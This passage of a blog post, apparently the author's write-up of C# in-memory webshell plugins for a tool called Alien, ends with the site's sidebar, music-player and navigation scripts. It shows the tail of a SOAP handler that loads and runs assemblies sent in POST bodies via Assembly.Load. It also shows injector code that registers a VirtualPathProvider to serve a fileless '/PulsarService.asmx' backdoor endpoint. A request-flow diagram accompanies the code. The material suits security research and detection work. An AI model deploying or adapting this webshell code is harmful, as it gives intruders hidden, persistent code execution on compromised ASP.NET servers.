class="hljs-number">15</span>]);<br><br>                    Assembly asm = Assembly.Load(rawData);<br>                    loader = Activator.CreateInstance(asm.GetType(<span class="hljs-string">&quot;NebulaPulsar&quot;</span>));<br>                    ctx.Session[<span class="hljs-string">&quot;nebulapulsar&quot;</span>] = loader;<br>                    ctx.Response.Write(<span class="hljs-string">&quot;LOADER_INIT_SUCCESS&quot;</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    ctx.Items[<span class="hljs-string">&quot;rawPostData&quot;</span>] = rawData;<br>                    loader.GetType().GetMethod(<span class="hljs-string">&quot;Equals&quot;</span>, <span class="hljs-keyword">new</span> Type[] &#123; <span class="hljs-keyword">typeof</span>(<span class="hljs-built_in">object</span>) &#125;).Invoke(loader, <span class="hljs-keyword">new</span> <span class="hljs-built_in">object</span>[] &#123; ctx &#125;);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (Exception ex)<br>            &#123;<br>                ctx.Response.Write(<span class="hljs-string">&quot;SOAP_DYNAMIC_EXEC_FAULT: &quot;</span> + ex.Message);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>The corresponding injector registers the handler with a <code>VirtualPathProvider</code>, allowing Alien to expose a virtual SOAP endpoint such as <code>/PulsarService.asmx</code> without creating a physical file.</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs C#"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrEmpty(szUrlPattern))<br>    szUrlPattern = <span class="hljs-string">&quot;/PulsarService.asmx&quot;</span>;<br><span class="hljs-keyword">if</span> (!szUrlPattern.StartsWith(<span class="hljs-string">&quot;/&quot;</span>))<br>    szUrlPattern = <span class="hljs-string">&quot;/&quot;</span> + szUrlPattern;<br><br><span class="hljs-built_in">byte</span>[] rawSoapCodeBytes = Convert.FromBase64String(szWebShellBase64);<br><br>MyStealthSoapHandler soapHandlerInstance = <span class="hljs-keyword">new</span> MyStealthSoapHandler(rawSoapCodeBytes);<br><br><span class="hljs-keyword">lock</span> (currentContext.Application)<br>&#123;<br>    currentContext.Application[<span class="hljs-string">&quot;HANDLER_GATE_&quot;</span> + szUrlPattern.ToLower()] = soapHandlerInstance;<br>&#125;<br><br>MyPathProvider shadowSoapProvider = <span class="hljs-keyword">new</span> MyPathProvider(szUrlPattern, szWebShellBase64);<br>HostingEnvironment.RegisterVirtualPathProvider(shadowSoapProvider);<br>fnGlobalClearCache();<br><br><span class="hljs-keyword">return</span> <span class="hljs-string">$&quot;[+] SUCCESS: WCF/SOAP Dynamic Endpoint successfully allocated and shadows-linked at [<span class="hljs-subst">&#123;szUrlPattern&#125;</span>]!&quot;</span>;<br></code></pre></td></tr></table></figure>
+<p>The request flow can therefore be summarized as:</p>
+<div class="mermaid">
+
+sequenceDiagram
+    participant C as Client
+    participant I as IIS
+    participant A as ASP.NET
+    participant V as VirtualPathProvider
+    participant H as In-Memory Handler
+
+    C->>I: POST /PulsarService.asmx
+    I->>A: Forward HTTP request
+    A->>V: Resolve virtual path
+    V-->>A: Virtual resource exists
+    A->>H: Invoke ProcessRequest()
+    H->>H: Process request data
+    H-->>C: HTTP response
+
+</div>
+
+<p>Demonstration with Alien:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-8-29-CSharpMemoryShell/10.png'><img src="/images/article/2026-8-29-CSharpMemoryShell/10.png" width=700/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-8-29-CSharpMemoryShell/11.png'><img src="/images/article/2026-8-29-CSharpMemoryShell/11.png" width=700/>
+</p>
+
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>In this article, I introduced several types of C# in-memory shells and explained how they can be implemented through different ASP.NET extension points, including <code>VirtualPathProvider</code>, <code>IHttpHandler</code>, and SOAP/WCF endpoints.</p>
+<p>These techniques demonstrate how an in-memory web shell can be integrate into different stages of the ASP.NET request-processing pipeline. Alien provides a convenient way to experiment with these techniques and observe how different webshell implementations behave in a real ASP.NET environment.</p>
+<p>I will continue improving Alien and its memory shell plugins in future releases, as well as exploring other techniques related to in-memory execution and web application security.</p>
+<p>If you have any suggestions or comments, please feel free to leave them below.</p>
+<h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p>I have been having some trouble sleeping and struggling with a few things recently…</p>
+<p>Anyway, thanks for reading! I hope everything will be OK!</p>
+<p align="center" class='item-img' data-src='/images/DreamLover/girl.png'><img src="/images/DreamLover/girl.png" width=700/>
+</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2026/08/23/2026-8-23-JavaMemoryShell/">[Alien] Java In-memory Webshell Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="utterances-sel"></button></div><div id="utterances-container"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/" width="200" id="logo"><img src="https://avatars.githubusercontent.com/u/110074064?v=4" alt="Logo"></a><h1 id="Dr"><a href="/">ISSAC</a></h1><div id="description"><p>Everything is failing...</p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://x.com/iss4c_f0ng/"><i class="fab fa-twitter" alt="X"></i></a></div><div id="rss-feed"><a class="social" id="rss-copy-button" href="javascript:void(0)" title="Copy RSS link to clipboard"><span>RSS</span></a></div></div><div id="music"></div><div class="music-box"><hr style="border:1px solid #ccc; margin:10px 0"><p class="music-title">Feeling exhausted? Let's enjoy (やさしい) music!</p><p style="text-align:center; position: relative"><img class="music-anime" id="anime-img" src="/images/meme/himari_coffee.2.jpg" width="150" height="200"></p><div style="text-align:center"><button class="music-btn" id="music-prev">⏮</button><button class="music-btn" id="music-toggle">▶ Play Music</button><button class="music-btn" id="music-next">⏭</button></div><div style="margin-top:5px"><span id="music-index"></span></div><hr style="border:1px solid #ccc; margin:10px 0"><audio id="bg-music"><source src="/mp3/music/music_1.mp3" type="audio/mpeg"></audio><script>document.addEventListener("DOMContentLoaded", function () {
+  var playlist = [
+    "/mp3/music/music_1.mp3",
+    "/mp3/music/sugar_story.mp3",
+    "/mp3/music/story_music_box.mp3",
+    "/mp3/music/last_page.mp3",
+    "/mp3/music/sunset_memory.mp3",
+    "/mp3/music/welcome_home.mp3",
+    "/mp3/music/canon.mp3",
+    "/mp3/music/arigadou.mp3",
+  ];
+
+  var current = 0;
+  const audio = document.getElementById("bg-music");
+  const btn = document.getElementById("music-toggle");
+  const prevBtn = document.getElementById("music-prev");
+  const nextBtn = document.getElementById("music-next");
+  const indexDisplay = document.getElementById("music-index");
+
+  function updateDisplay() {
+    indexDisplay.innerText = `Currently: ${current + 1} / ${playlist.length}`;
+  }
+
+  updateDisplay();
+
+  btn.addEventListener("click", function () {
+    if (audio.paused) {
+      audio.src = playlist[current];
+      audio.play();
+      btn.innerText = "⏸ Pause Music";
+    } else {
+      audio.pause();
+      btn.innerText = "▶ Play Music";
+    }
+  });
+
+  nextBtn.addEventListener("click", function () {
+    const wasPlaying = !audio.paused;
+
+    current = (current + 1) % playlist.length;
+
+    audio.src = playlist[current];
+    audio.load();
+
+    if (wasPlaying) {
+      audio.play();
+    }
+
+    updateDisplay();
+  });
+
+  prevBtn.addEventListener("click", function () {
+    const wasPlaying = !audio.paused;
+
+    current--;
+
+    if (current < 0)
+      current = playlist.length - 1;
+
+    audio.src = playlist[current];
+    audio.load();
+
+    if (wasPlaying) {
+      audio.play();
+    }
+
+    updateDisplay();
+  });
+
+  audio.addEventListener("ended", function() {
+    current = (current + 1) % playlist.length;
+    audio.src = playlist[current];
+    audio.play();
+    updateDisplay();
+  });
+});
+</script><script>document.addEventListener("DOMContentLoaded", function () {
+  const animeImg = document.getElementById("anime-img");
+
+  animeImg.addEventListener("click", function() {
+    
+    const tip = document.createElement("div");
+    tip.innerText = "?";
+    tip.style.position = "absolute";
+    tip.style.top = "-50px";
+    tip.style.left = "50%";
+    tip.style.transform = "translateX(-50%)";
+    tip.style.backgroundColor = "#fff";
+    tip.style.color = "rgb(16, 174, 11)";
+    tip.style.padding = "2px 6px";
+    tip.style.border = "1px solid #ccc";
+    tip.style.borderRadius = "8px";
+    tip.style.boxShadow = "0 3px 6px rgba(0,0,0,0.2)";
+    tip.style.fontSize = "50px";
+    tip.style.fontWeight = "bold";
+    tip.style.zIndex = "1000";
+    tip.style.opacity = "1";
+    tip.style.transition = "opacity 1s, top 1s";
+    
+    animeImg.parentElement.appendChild(tip);
+
+    setTimeout(() => {
+      tip.style.opacity = "0";
+      tip.style.top = "-60px";
+      setTimeout(() => tip.remove(), 1000);
+    }, 2000);
+  });
+});
+</script><script>document.addEventListener("DOMContentLoaded", function () {
+  const rssBtn = document.getElementById("rss-copy-button");
+
+  rssBtn.addEventListener("click", async () => {
+    const rssUrl = window.location.origin + "/atom.xml";
+    try {
+      await navigator.clipboard.writeText(rssUrl);
+
+      const tip = document.createElement("div");
+      tip.innerText = "RSS link copied!";
+      tip.style.position = "absolute";
+      tip.style.top = "-30px";
+      tip.style.left = "50%";
+      tip.style.transform = "translateX(-50%)";
+      tip.style.backgroundColor = "#0d0d0d";
+      tip.style.color = "#00fff7";
+      tip.style.border = "1px solid #ff00ff";
+      tip.style.boxShadow = "0 0 8px #ff00ff, 0 0 16px #00fff7";
+      tip.style.padding = "2px 6px";
+      tip.style.borderRadius = "8px";
+      tip.style.fontSize = "14px";
+      tip.style.fontWeight = "bold";
+      tip.style.zIndex = "1000";
+      tip.style.opacity = "1";
+      tip.style.transition = "opacity 1s, top 1s";
+
+      rssBtn.style.position = "relative";
+      rssBtn.appendChild(tip);
+
+      setTimeout(() => {
+        tip.style.opacity = "0";
+        tip.style.top = "-40px";
+        setTimeout(() => tip.remove(), 1000);
+      }, 2000);
+
+    } catch (err) {
+      console.error("Failed to copy: ", err);
+    }
+  });
+});
+</script></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Plugin"><span class="toc-number">2.</span> <span class="toc-text">Plugin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IIS-VirtualFile"><span class="toc-number">2.1.</span> <span class="toc-text">IIS VirtualFile</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IIS-Handler"><span class="toc-number">2.2.</span> <span class="toc-text">IIS Handler</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WCF-SOAP"><span class="toc-number">2.3.</span> <span class="toc-text">WCF &#x2F; SOAP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-number">3.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#THANKS-FOR-READING"><span class="toc-number">4.</span> <span class="toc-text">THANKS FOR READING</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/custom.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><script src="/js/slide.js"></script></body></html>
